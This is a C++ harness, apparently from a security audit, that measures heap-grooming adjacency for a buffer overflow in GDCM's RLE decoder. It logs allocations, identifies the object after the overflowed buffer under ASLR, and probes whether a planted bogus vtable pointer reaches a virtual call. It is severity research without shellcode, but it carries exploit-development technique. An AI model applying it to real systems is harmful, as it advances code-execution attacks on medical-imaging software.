// Finding 1 - real-heap adjacency and grooming study (no allocator crutches).
//
// finding01_exploit.cpp proves the overflow is a controlled function-pointer
// write, but only by relocating a victim object to a fixed spot via a
// replaced global operator new[], building -no-pie, and self-supplying the
// planted branch target. This harness removes all three crutches and asks
// the question that actually determines real-world severity: with stock
// glibc malloc, default PIE and ASLR on, what genuinely ends up in memory
// immediately after RLECodec::Decode's `new char[24576]`, how often, and
// does GDCM ever make a virtual call on it before teardown?
//
// Technique (all observational -- nothing is relocated):
//   - override global operator new/delete (scalar and array) to RECORD
//     every allocation's address, size, and call site; frees are recorded
//     too, while allocation and release still go through malloc/free.
//     These hooks are instrumentation and may affect call paths even though
//     they do not choose or relocate returned addresses.
//   - after RLECodec::Decode's 24576-byte allocation A is identified,
//     compute the address of the *next physical chunk*'s user pointer via
//     malloc_usable_size(A): B = A + malloc_usable_size(A) + sizeof(size_t)
//     on the tested 64-bit glibc layout. This is a
//     pure function of the allocator's bookkeeping, not a guess.
//   - if some tracked allocation's pointer equals B, that is what's really
//     there; we read *only* its first 8 bytes (a candidate vtable pointer)
//     and resolve it with dladdr() against the *loaded* library, never
//     printing the raw value -- just the demangled symbol name, e.g.
//     "vtable for gdcm::ByteValue", when it resolves to one.
//   - because ASLR only varies base addresses per *process*, statistics are
//     gathered by re-executing this same binary (execve, not fork-reuse of
//     the same image) N times and aggregating each child's one-line result.
//
// Usage:
//   finding01_groom <trials> <dicom-file> [groom-count]
//     Fork/exec <trials> fresh child processes against <dicom-file>,
//     optionally priming the heap with <groom-count> retained same-shaped
//     blocks before Read() to see whether grooming shifts adjacency.
//   finding01_groom --child <dicom-file> [groom-count]
//     Run exactly one trial in this process and print one "RESULT ..." line.
//   finding01_groom --probe <trials> <dicom-file>
//     Like the first form, but does not classify -- just reports how many
//     of <trials> runs crash (SIGSEGV/SIGILL/...) vs. complete, for use
//     against a file built with generators/finding-01-exploit.py --plant
//     to write a bogus vtable pointer at a previously discovered offset.
//
// Files this harness reads/writes: only the DICOM path given on argv and,
// in driver mode, its own executable (re-exec via /proc/self/exe).

#include "gdcmImageReader.h"

#include <sys/wait.h>
#include <unistd.h>
#include <malloc.h>
#include <dlfcn.h>
#include <cxxabi.h>
#include <fcntl.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <climits>
#include <csignal>
#include <new>
#include <string>
#include <map>
#include <vector>

namespace {

// Must match the allocation this generator/schema produces: RLECodec::Decode
// (3-D path) for the 64x64, SamplesPerPixel=3, 2-frame image is
// `new char[ROWS*COLS*SPP*FRAMES]` = new char[24576].
const size_t kTargetSize = 24576;

// ---------------------------------------------------------------------
// Allocation tracker. Fixed-size static table so the hooks never allocate.
// ---------------------------------------------------------------------
struct Rec {
  uintptr_t ptr;
  uint32_t size;
  uint32_t seq;
  bool is_array;
  bool freed;
  void *retaddr;
};

const int kMaxRecords = 300000;
Rec g_recs[kMaxRecords];
int g_count = 0;
bool g_tracking = false;

void record(void *p, size_t size, bool is_array, void *ra) {
  if (!g_tracking || !p) return;
  int i = g_count;
  if (i >= kMaxRecords) return;
  g_count = i + 1;
  g_recs[i].ptr = reinterpret_cast<uintptr_t>(p);
  g_recs[i].size = static_cast<uint32_t>(size);
  g_recs[i].seq = static_cast<uint32_t>(i);
  g_recs[i].is_array = is_array;
  g_recs[i].freed = false;
  g_recs[i].retaddr = ra;
}

void mark_freed(void *p) {
  if (!g_tracking || !p) return;
  uintptr_t up = reinterpret_cast<uintptr_t>(p);
  for (int i = g_count - 1; i >= 0; --i) {
    if (g_recs[i].ptr == up && !g_recs[i].freed) { g_recs[i].freed = true; return; }
  }
}

}  // namespace

void *operator new(size_t sz) {
  void *p = std::malloc(sz ? sz : 1);
  if (!p) throw std::bad_alloc();
  record(p, sz, false, __builtin_return_address(0));
  return p;
}
void *operator new[](size_t sz) {
  void *p = std::malloc(sz ? sz : 1);
  if (!p) throw std::bad_alloc();
  record(p, sz, true, __builtin_return_address(0));
  return p;
}
void *operator new(size_t sz, const std::nothrow_t &) noexcept {
  void *p = std::malloc(sz ? sz : 1);
  if (p) record(p, sz, false, __builtin_return_address(0));
  return p;
}
void *operator new[](size_t sz, const std::nothrow_t &) noexcept {
  void *p = std::malloc(sz ? sz : 1);
  if (p) record(p, sz, true, __builtin_return_address(0));
  return p;
}
void operator delete(void *p) noexcept { mark_freed(p); std::free(p); }
void operator delete(void *p, size_t) noexcept { mark_freed(p); std::free(p); }
void operator delete[](void *p) noexcept { mark_freed(p); std::free(p); }
void operator delete[](void *p, size_t) noexcept { mark_freed(p); std::free(p); }

namespace {

// ---------------------------------------------------------------------
// Optional pre-Read() heap priming. This cannot place anything *after*
// RLECodec::Decode's buffer (everything the harness allocates runs before
// GDCM ever calls new char[24576]) -- it can only perturb the allocator's
// bin/top-chunk state at the moment that allocation happens, the same way
// a real file's preceding data elements (each a heap-allocated ByteValue,
// per gdcmDataElement.h:128) would. Blocks are deliberately leaked for the
// process lifetime, mirroring how GDCM keeps every parsed element's
// ByteValue alive in the DataSet until the file object is destroyed.
void prime_heap(int count) {
  for (int i = 0; i < count; ++i) {
    // 64 bytes: in the ballpark of a small ByteValue-backed attribute
    // (vtable ptr + refcount + std::vector<char> control block + a few
    // bytes of short string value), the most common allocation shape GDCM
    // produces while parsing a dataset header.
    void *p = std::malloc(64);
    if (p) std::memset(p, 0, 64);
    // deliberately not freed -- see comment above
    (void)p;
  }
}

// ---------------------------------------------------------------------
// Pure, allocation-free adjacency lookup. Reads only g_recs (a static
// array) plus one malloc_usable_size() call -- no heap allocation, no
// std::string -- so this avoids allocator calls from the crash handler
// below, where the process may be mid-abort with the malloc arena lock
// already held by this same thread (calling malloc again there would
// self-deadlock, not crash).
// ---------------------------------------------------------------------
struct ClassifyOut {
  bool found_target = false;
  uintptr_t A = 0, B = 0;
  size_t usable = 0;
  long overflow_offset = 0;
  int occ_idx = -1;       // exact match at B, or -1
  int interior_idx = -1;  // fallback: B falls inside a larger tracked block
};

ClassifyOut classify_locate() {
  ClassifyOut out;
  int buf_idx = -1;
  for (int i = 0; i < g_count; ++i) {
    if (g_recs[i].is_array && g_recs[i].size == kTargetSize) buf_idx = i;
  }
  if (buf_idx < 0) return out;
  out.found_target = true;

  uintptr_t A = g_recs[buf_idx].ptr;
  uint32_t seq_buf = g_recs[buf_idx].seq;
  size_t usable = malloc_usable_size(reinterpret_cast<void *>(A));
  // See the long derivation above run_child's use of this: next chunk's
  // user pointer is A + usable_size(A) + sizeof(size_t) on 64-bit glibc.
  uintptr_t B = A + usable + sizeof(size_t);
  out.A = A;
  out.B = B;
  out.usable = usable;
  out.overflow_offset = static_cast<long>(B) - static_cast<long>(A + kTargetSize);

  // Address B can be recycled through several allocate/free cycles between
  // the buffer's own creation and the moment we inspect (empirically
  // confirmed: on the real trigger file, B cycles through 4 different
  // allocations -- sizes 12448, 2049, 12288, 2049 in that order -- all
  // freed by crash time). Reporting the *earliest* post-buffer match here
  // would describe a tenant that had already vacated long before the
  // overflow write or our inspection; what actually matters (what a reader
  // of occ_size/occ_freed would take this to mean) is the *most recent*
  // occupant, i.e. the largest seq, not the smallest.
  int occ_idx = -1;
  uint32_t occ_seq = 0;
  for (int i = 0; i < g_count; ++i) {
    if (g_recs[i].ptr == B && g_recs[i].seq > seq_buf && g_recs[i].seq >= occ_seq) {
      occ_idx = i;
      occ_seq = g_recs[i].seq;
    }
  }
  out.occ_idx = occ_idx;
  if (occ_idx < 0) {
    int best = -1;
    for (int i = 0; i < g_count; ++i) {
      uintptr_t lo = g_recs[i].ptr, hi = lo + g_recs[i].size;
      if (B >= lo && B < hi) {
        if (best < 0 || g_recs[i].seq > g_recs[best].seq) best = i;
      }
    }
    out.interior_idx = best;
  }
  return out;
}

// ---------------------------------------------------------------------
// Crash handler: if the overflow corrupted a live chunk's free-list
// metadata badly enough that glibc's own consistency check aborts (or if
// GDCM itself later segfaults dereferencing something the overflow
// clobbered), that happens *inside* the same process, often before
// run_child ever reaches its own RESULT print. Rather than lose the
// trial, classify right here and print our own RESULT line.
//
// This may run with the malloc arena mutex already held by this
// same (single) thread -- glibc's malloc_printerr() does not release it
// before calling abort(). So this handler must not, directly or
// indirectly, call malloc/free/new/delete:
//   - classify_locate() above reads a static array and allocator metadata.
//   - abi::__cxa_demangle() is deliberately not called here.
//   - output uses snprintf() into a stack buffer + write(2, ...), never
//     stdio's FILE* printf (whose buffer/lock could itself need a first
//     malloc). This means the crash-path RESULT line goes to fd 1
//     directly, same file descriptor the driver's pipe is already
//     dup2'd onto, so the driver still captures it as if it were normal
//     stdout. This handler is diagnostic best effort; snprintf() and
//     dladdr() are not guaranteed async-signal-safe.
// A reentrancy guard forces a second fault straight to the default
// action instead of recursing.
volatile sig_atomic_t g_in_handler = 0;

void crash_handler(int sig) {
  if (g_in_handler) _exit(128 + sig);
  g_in_handler = 1;

  char buf[512];
  int n;
  ClassifyOut c = classify_locate();
  if (!c.found_target) {
    n = snprintf(buf, sizeof(buf),
                 "RESULT read_ok=-1 category=NO_TARGET_ALLOC crash_signal=%d\n", sig);
    ssize_t w = write(1, buf, n > 0 ? n : 0); (void)w;
    _exit(200 + sig);
  }

  const char *category = "TOP_CHUNK_OR_UNTRACKED";
  uint32_t occ_size = 0;
  int occ_freed = 0;
  const char *klass = "-";  // raw mangled symbol, or "-"

  if (c.occ_idx >= 0) {
    occ_size = g_recs[c.occ_idx].size;
    occ_freed = g_recs[c.occ_idx].freed ? 1 : 0;
    if (occ_freed) {
      category = "FREED_CHUNK";
    } else if (occ_size >= 8) {
      void *vp = *reinterpret_cast<void **>(c.B);
      Dl_info info;
      std::memset(&info, 0, sizeof(info));
      if (dladdr(vp, &info) && info.dli_sname) {
        // Raw mangled vtable symbols look like "_ZTVN4gdcm9ByteValueE";
        // that prefix alone is enough to call it a vtable without the
        // demangler (which would need malloc).
        category = (std::strncmp(info.dli_sname, "_ZTV", 4) == 0)
                       ? "VTABLE_VICTIM_RAW"
                       : "LIVE_NO_VTABLE";
        klass = info.dli_sname;
      } else {
        category = "LIVE_NO_VTABLE";
      }
    } else {
      category = "LIVE_TOO_SMALL";
    }
  } else if (c.interior_idx >= 0) {
    occ_size = g_recs[c.interior_idx].size;
    occ_freed = g_recs[c.interior_idx].freed ? 1 : 0;
    category = occ_freed ? "INTERIOR_OF_FREED_ALLOC" : "INTERIOR_OF_ALLOC";
  }

  n = snprintf(buf, sizeof(buf),
               "RESULT read_ok=-1 category=%s class=%s module=- occ_size=%u "
               "occ_freed=%d overflow_offset=%ld usable=%zu buf_addr=%p crash_signal=%d\n",
               category, klass, occ_size, occ_freed, c.overflow_offset, c.usable,
               reinterpret_cast<void *>(c.A), sig);
  ssize_t w = write(1, buf, n > 0 ? n : 0); (void)w;
  _exit(200 + sig);
}

void install_crash_handlers() {
  struct sigaction sa;
  std::memset(&sa, 0, sizeof(sa));
  sa.sa_handler = crash_handler;
  sigemptyset(&sa.sa_mask);
  sa.sa_flags = 0;  // no SA_RESTART: default is fine, we _exit() anyway
  sigaction(SIGABRT, &sa, nullptr);
  sigaction(SIGSEGV, &sa, nullptr);
  sigaction(SIGBUS, &sa, nullptr);
  sigaction(SIGILL, &sa, nullptr);
}

// ---------------------------------------------------------------------
// Symbol classification for a candidate vtable pointer, via dladdr()
// against the *actually loaded* libraries -- no static offsets guessed.
// ---------------------------------------------------------------------
std::string classify_vptr(void *vp, std::string *module_out) {
  Dl_info info;
  memset(&info, 0, sizeof(info));
  if (!dladdr(vp, &info) || !info.dli_sname) return std::string();
  if (info.dli_fname) *module_out = info.dli_fname;
  int status = 0;
  char *demangled = abi::__cxa_demangle(info.dli_sname, nullptr, nullptr, &status);
  std::string name = (status == 0 && demangled) ? std::string(demangled) : std::string(info.dli_sname);
  free(demangled);
  return name;
}

// ---------------------------------------------------------------------
// Child (single-trial) mode.
// ---------------------------------------------------------------------
int run_child(const char *dcm_path, int groom_count) {
  // Installed before anything else: the overflow can corrupt a live
  // chunk's free-list metadata badly enough that glibc's own consistency
  // check aborts *during* Read() itself (observed in practice -- "corrupted
  // double-linked list" -- well before this function would otherwise reach
  // its own classification code below). See crash_handler()'s comment for
  // why it is safe to run with the malloc arena lock already held.
  install_crash_handlers();

  if (groom_count > 0) prime_heap(groom_count);

  g_tracking = true;
  gdcm::ImageReader reader;
  reader.SetFileName(dcm_path);
  bool read_ok = false;
  try {
    read_ok = reader.Read();
  } catch (const std::exception &) {
  } catch (...) {
  }
  g_tracking = false;

  ClassifyOut c = classify_locate();
  if (!c.found_target) {
    std::printf("RESULT read_ok=%d category=NO_TARGET_ALLOC crash_signal=0\n",
                read_ok ? 1 : 0);
    std::fflush(stdout);
    return 0;
  }

  std::string category, klass, module;
  uint32_t occ_size = 0;
  bool occ_freed = false;

  if (c.occ_idx >= 0) {
    occ_size = g_recs[c.occ_idx].size;
    occ_freed = g_recs[c.occ_idx].freed;
    if (occ_freed) {
      category = "FREED_CHUNK";
    } else if (occ_size >= 8) {
      void *vp = *reinterpret_cast<void **>(c.B);
      std::string sym = classify_vptr(vp, &module);
      if (sym.compare(0, 11, "vtable for ") == 0) {
        category = "VTABLE_VICTIM";
        klass = sym.substr(11);
      } else {
        category = "LIVE_NO_VTABLE";
      }
    } else {
      category = "LIVE_TOO_SMALL";
    }
  } else if (c.interior_idx >= 0) {
    occ_size = g_recs[c.interior_idx].size;
    occ_freed = g_recs[c.interior_idx].freed;
    category = occ_freed ? "INTERIOR_OF_FREED_ALLOC" : "INTERIOR_OF_ALLOC";
  } else {
    category = "TOP_CHUNK_OR_UNTRACKED";
  }

  std::printf("RESULT read_ok=%d category=%s class=%s module=%s occ_size=%u "
              "occ_freed=%d overflow_offset=%ld usable=%zu buf_addr=%p crash_signal=0\n",
              read_ok ? 1 : 0, category.c_str(),
              klass.empty() ? "-" : klass.c_str(),
              module.empty() ? "-" : module.c_str(),
              occ_size, occ_freed ? 1 : 0, c.overflow_offset,
              c.usable, reinterpret_cast<void *>(c.A));
  // The overflow can also corrupt a live chunk enough that glibc's
  // consistency checks abort() during later teardown (e.g. when the
  // ImageReader's destructor frees something the overflow clobbered)
  // *after* this line has already been produced. Force it out now so the
  // driver still gets the classification even if the child is
  // subsequently killed by a signal -- losing that line to stdio
  // buffering would silently discard real data, not just formatting.
  std::fflush(stdout);
  return 0;
}

// ---------------------------------------------------------------------
// Driver: re-exec this binary N times (fresh ASLR per process) and
// aggregate the RESULT lines. Also used for the crash-probe pass.
// ---------------------------------------------------------------------
struct ChildOutcome {
  bool exited_normally;
  int exit_code;
  bool signaled;
  int signal;
  std::string result_line;  // stdout, if any
};

ChildOutcome run_one_child(const std::string &self_path, const char *dcm_path, int groom_count) {
  int pipefd[2];
  if (pipe(pipefd) != 0) { std::perror("pipe"); std::exit(1); }
  pid_t pid = fork();
  if (pid < 0) { std::perror("fork"); std::exit(1); }
  if (pid == 0) {
    close(pipefd[0]);
    dup2(pipefd[1], STDOUT_FILENO);
    close(pipefd[1]);
    char groom_buf[16];
    std::snprintf(groom_buf, sizeof(groom_buf), "%d", groom_count);
    execl(self_path.c_str(), self_path.c_str(), "--child", dcm_path, groom_buf,
          static_cast<char *>(nullptr));
    std::perror("execl");
    std::exit(127);
  }
  close(pipefd[1]);
  std::string out;
  char buf[4096];
  ssize_t n;
  while ((n = read(pipefd[0], buf, sizeof(buf))) > 0) out.append(buf, static_cast<size_t>(n));
  close(pipefd[0]);
  int status = 0;
  waitpid(pid, &status, 0);

  ChildOutcome oc;
  oc.exited_normally = WIFEXITED(status);
  oc.exit_code = oc.exited_normally ? WEXITSTATUS(status) : -1;
  oc.signaled = WIFSIGNALED(status);
  oc.signal = oc.signaled ? WTERMSIG(status) : 0;
  size_t p = out.find("RESULT ");
  oc.result_line = (p == std::string::npos) ? std::string() : out.substr(p);
  return oc;
}

std::string field(const std::string &line, const std::string &key) {
  std::string needle = key + "=";
  size_t p = line.find(needle);
  if (p == std::string::npos) return std::string();
  p += needle.length();
  size_t q = line.find_first_of(" \t\r\n", p);
  return (q == std::string::npos) ? line.substr(p) : line.substr(p, q - p);
}

std::string self_exe_path() {
  char buf[4096];
  ssize_t n = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
  if (n <= 0) { std::perror("readlink /proc/self/exe"); std::exit(1); }
  buf[n] = '\0';
  return std::string(buf);
}

int run_driver(int trials, const char *dcm_path, int groom_count) {
  std::string self = self_exe_path();
  std::map<std::string, int> category_counts;
  std::map<std::string, int> class_counts;      // only within VTABLE_VICTIM
  std::map<std::string, int> offset_counts;      // sanity: is offset stable?
  int crashes = 0, no_target = 0, post_result_aborts = 0;

  std::printf("# finding01_groom driver: trials=%d file=%s groom_count=%d\n",
              trials, dcm_path, groom_count);
  std::printf("# %-6s %-24s %-40s %-8s %-10s %s\n",
              "trial", "category", "class", "occsize", "offset", "note");

  for (int t = 0; t < trials; ++t) {
    ChildOutcome oc = run_one_child(self, dcm_path, groom_count);
    // A dying child does not by itself mean the classification is
    // unusable: the overflow can corrupt a live chunk's free-list
    // metadata, and glibc's own consistency check then aborts -- often
    // *inside the same Read() call*, before run_child would otherwise
    // reach its own classification. crash_handler() (installed at the
    // top of run_child) catches SIGABRT/SIGSEGV/SIGBUS/SIGILL, classifies
    // right there with an allocation-free code path, and _exit()s cleanly
    // -- so the trial still shows up here as a RESULT line, with a
    // nonzero crash_signal field, rather than as a bare signal death. Only
    // a signal we did *not* install a handler for (e.g. SIGKILL) would
    // still reach the oc.signaled branch below with no RESULT line.
    if (!oc.result_line.empty()) {
      std::string cat = field(oc.result_line, "category");
      std::string cls = field(oc.result_line, "class");
      std::string occsize = field(oc.result_line, "occ_size");
      std::string off = field(oc.result_line, "overflow_offset");
      std::string crashsig = field(oc.result_line, "crash_signal");
      category_counts[cat]++;
      if (cat == "VTABLE_VICTIM" || cat == "VTABLE_VICTIM_RAW") {
        class_counts[cls]++;
        offset_counts[off]++;
      }
      bool post_crash = (!crashsig.empty() && crashsig != "0");
      if (post_crash) {
        ++crashes;
        ++post_result_aborts;
        std::printf("  %-6d %-24s %-40s %-8s %-10s POST_RESULT_ABORT(signal=%s)\n",
                    t, cat.c_str(), cls.c_str(), occsize.c_str(), off.c_str(), crashsig.c_str());
      } else {
        std::printf("  %-6d %-24s %-40s %-8s %-10s\n", t, cat.c_str(), cls.c_str(),
                    occsize.c_str(), off.c_str());
      }
      continue;
    }
    if (oc.signaled) {
      ++crashes;
      std::printf("  %-6d CRASHED(signal=%d, uncaught)\n", t, oc.signal);
      continue;
    }
    ++no_target;
    std::printf("  %-6d NO_RESULT_LINE(exit=%d)\n", t, oc.exit_code);
  }

  std::printf("\n# category distribution over %d trial(s):\n", trials);
  for (std::map<std::string, int>::iterator it = category_counts.begin();
       it != category_counts.end(); ++it) {
    std::printf("#   %-24s %d/%d\n", it->first.c_str(), it->second, trials);
  }
  if (crashes) std::printf("#   %-24s %d/%d\n", "CRASHED", crashes, trials);
  if (post_result_aborts)
    std::printf("#     (of which %d/%d classified successfully before a later\n"
                "#      teardown abort -- see POST_RESULT_ABORT rows above)\n",
                post_result_aborts, trials);
  if (no_target) std::printf("#   %-24s %d/%d\n", "NO_RESULT_LINE", no_target, trials);

  if (!class_counts.empty()) {
    std::printf("\n# victim class distribution (within VTABLE_VICTIM):\n");
    for (std::map<std::string, int>::iterator it = class_counts.begin();
         it != class_counts.end(); ++it) {
      std::printf("#   %-40s %d/%d\n", it->first.c_str(), it->second, trials);
    }
    std::printf("\n# overflow_offset distribution (within VTABLE_VICTIM; should be\n"
                "# allocator-determined, not address-dependent, so a single stable\n"
                "# value here is expected even though addresses vary per trial):\n");
    for (std::map<std::string, int>::iterator it = offset_counts.begin();
         it != offset_counts.end(); ++it) {
      std::printf("#   offset=%-10s %d/%d\n", it->first.c_str(), it->second, trials);
    }
  }

  // Verdict.
  std::string best_class;
  int best_n = 0;
  for (std::map<std::string, int>::iterator it = class_counts.begin();
       it != class_counts.end(); ++it) {
    if (it->second > best_n) { best_n = it->second; best_class = it->first; }
  }
  if (best_n > 0) {
    std::printf("\nGROOM_VICTIM_CONTROLLED %s reliability=%d/%d\n",
                best_class.c_str(), best_n, trials);
  } else {
    std::printf("\nGROOM_NO_RELIABLE_VICTIM\n");
  }
  return 0;
}

// ---------------------------------------------------------------------
// Crash-probe driver: run <trials> fresh processes against a file already
// built (by generators/finding-01-exploit.py --plant, unmodified) to write
// a non-canonical value at a previously-discovered vtable-slot offset, and
// report how many crash vs. complete. A crash whose signal is SIGSEGV (or
// SIGILL/SIGBUS from an attempted indirect branch) demonstrates that GDCM
// does reach a virtual call on the corrupted object before teardown -- the
// harness never redirects that call anywhere, so no gadget chain or
// shellcode is ever involved; the process just faults on the bogus target.
// ---------------------------------------------------------------------
int run_probe(int trials, const char *dcm_path) {
  std::string self = self_exe_path();
  int crashes = 0, clean = 0, other = 0;
  std::printf("# finding01_groom probe: trials=%d file=%s\n", trials, dcm_path);
  for (int t = 0; t < trials; ++t) {
    ChildOutcome oc = run_one_child(self, dcm_path, 0);
    if (oc.signaled) {
      ++crashes;
      std::printf("  %-6d CRASHED(signal=%d)\n", t, oc.signal);
    } else if (oc.exited_normally) {
      ++clean;
      std::printf("  %-6d COMPLETED(exit=%d) %s\n", t, oc.exit_code, oc.result_line.c_str());
    } else {
      ++other;
      std::printf("  %-6d OTHER\n", t);
    }
  }
  std::printf("\n# crash=%d/%d complete=%d/%d other=%d/%d\n",
              crashes, trials, clean, trials, other, trials);
  if (crashes > 0) {
    std::printf("PROBE_VIRTUAL_CALL_REACHED reliability=%d/%d\n", crashes, trials);
  } else {
    std::printf("PROBE_VIRTUAL_CALL_NOT_OBSERVED\n");
  }
  return 0;
}

}  // namespace

int main(int argc, char *argv[]) {
  if (argc >= 3 && std::strcmp(argv[1], "--child") == 0) {
    int groom = (argc >= 4) ? std::atoi(argv[3]) : 0;
    return run_child(argv[2], groom);
  }
  if (argc >= 4 && std::strcmp(argv[1], "--probe") == 0) {
    return run_probe(std::atoi(argv[2]), argv[3]);
  }
  if (argc < 3) {
    std::fprintf(stderr,
                 "usage: %s <trials> <dicom-file> [groom-count]\n"
                 "       %s --child <dicom-file> [groom-count]\n"
                 "       %s --probe <trials> <dicom-file>\n",
                 argv[0], argv[0], argv[0]);
    return 2;
  }
  int trials = std::atoi(argv[1]);
  int groom = (argc >= 4) ? std::atoi(argv[3]) : 0;
  return run_driver(trials, argv[2], groom);
}
